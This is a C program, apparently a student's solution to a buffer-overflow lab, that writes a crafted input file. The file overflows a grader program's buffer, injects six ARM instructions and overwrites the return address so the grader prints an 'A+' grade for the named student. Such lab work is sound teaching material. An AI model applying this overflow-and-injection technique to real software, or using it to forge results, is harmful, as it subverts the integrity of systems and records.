/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* author: anish kataria                                               */
/*--------------------------------------------------------------------*/
/*
   this program creates a file named "dataAplus" that, when used as input to
   the grader program, coerces it into producing a grade of "A+" for "anishkkat".
   we achieve this by crafting an input that overflows the stack buffer:
   - write the name "anishkkat" and a null terminator
   - write padding bytes to align memory
   - write an 'A' character and some null bytes so we can print 'A' before adding '+'
   - insert instructions generated by the mini assembler:
       1) adr x0 to point to 'A'
       2) bl (branch with link) to a printing function at a known address
       3) mov w0, '+' (load '+' into w0)
       4) adr x1, &grade (load address of grade variable)
       5) strb w0, [x1] (store '+' into grade variable)
       6) b to the print-grade instruction
   - overwrite the return address so execution jumps into these instructions
   by ensuring no newline characters and exact alignment, the grader output is indistinguishable
   from normal, except that the grade is now 'A+' instead of 'A'.
*/

/*
   main function:
   - does not accept any command-line arguments
   - does not read from stdin or any other stream
   - writes a precisely crafted sequence of bytes to "dataAplus" only
   - returns 0 on success, 1 if the file cannot be opened
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"

/* constants (magic numbers) for this exploit */
#define BUF_TOTAL       48        /* total buffer bytes */
#define GRADE_ADDR      0x420044  /* address of grade variable */
#define PRINT_ADDR      0x40089c  /* address of instruction that prints grade */
#define RETURN_ADDR     0x420070  /* return address to overwrite for A+ attack */
#define NAME_ADDR       0x420058  /* start address of name in bss */
#define NAME_LEN        9         /* length of "anishkkat" without the null terminator */
#define PADDING_LEN     10        /* number of '0' padding bytes before 'A' char */
#define EXTRA_A_BYTES   4         /* 'A' + 3 null bytes */
#define NUM_INSTR       6         /* total number of instructions for A+ */
#define INSTR_SIZE      (NUM_INSTR * 4) /* each instruction 4 bytes */
#define CHAR_A          0x41      /* 'A' character as hex */
#define CHAR_PLUS       0x2B      /* '+' character as hex */

/* explanation of layout:
   name + '\0' = 9 +1 =10 bytes
   padding '0's =10 bytes → total so far 20 bytes
   write 'A' +3x'\0' =4 bytes → 24 bytes total
   6 instructions *4 bytes each =24 bytes → 48 bytes total
   after these 48 bytes (the entire buffer), write the return address (8 bytes)
   total: 48 +8 =56 bytes in the file
   no '\n' (0x0A) characters are introduced
*/

int main(void) {
    const char *p_name = "AnishKKat";   /* chosen student name */
    FILE *fp = fopen("dataAplus", "w");
    if (!fp) return 1;

    /* write name plus null terminator: 10 bytes total */
    fwrite(p_name, 1, NAME_LEN, fp);
    fputc('\0', fp);

    /* write PADDING_LEN (10) '0' characters for alignment */
    for (int i = 0; i < PADDING_LEN; i++) {
        fputc('0', fp);
    }

    /* write 'A' char followed by 3 null bytes
       this sets up a null-terminated "A" string at a known address */
    fputc('A', fp);
    fputc('\0', fp);
    fputc('\0', fp);
    fputc('\0', fp);

    /* now generate instructions needed for A+:
       steps:
       1) adr x0, address_of_A_string using 0x42006c & reference 0x420070
       2) bl to print function: bl(0x400690,0x420074)
          this prints 'A'
       3) mov w0, '+' (0x2B)
       4) adr x1, GRADE_ADDR with reference 0x42007c
       5) strb w0,[x1] store '+'
       6) b PRINT_ADDR with reference 0x420084 to print the final line
       
       addresses are chosen to ensure correct offsets.
    */
    unsigned int ui_instr_adr_x0 = MiniAssembler_adr(0, 0x42006c, 0x420070);
    unsigned int ui_instr_bl     = MiniAssembler_bl(0x400690, 0x420074);
    unsigned int ui_instr_mov    = MiniAssembler_mov(0, CHAR_PLUS);
    unsigned int ui_instr_adr_x1 = MiniAssembler_adr(1, GRADE_ADDR, 0x42007c);
    unsigned int ui_instr_strb   = MiniAssembler_strb(0, 1);
    unsigned int ui_instr_b      = MiniAssembler_b(PRINT_ADDR, 0x420084);

    /* write instructions in order */
    fwrite(&ui_instr_adr_x0, sizeof(unsigned int), 1, fp);
    fwrite(&ui_instr_bl,      sizeof(unsigned int), 1, fp);
    fwrite(&ui_instr_mov,     sizeof(unsigned int), 1, fp);
    fwrite(&ui_instr_adr_x1,  sizeof(unsigned int), 1, fp);
    fwrite(&ui_instr_strb,    sizeof(unsigned int), 1, fp);
    fwrite(&ui_instr_b,       sizeof(unsigned int), 1, fp);

    /* finally, write the return address after these 48 bytes (the entire buffer),
       forcing execution to jump into our instructions */
    unsigned long ul_ret = RETURN_ADDR;
    fwrite(&ul_ret, sizeof(unsigned long), 1, fp);

    fclose(fp);
    return 0;
}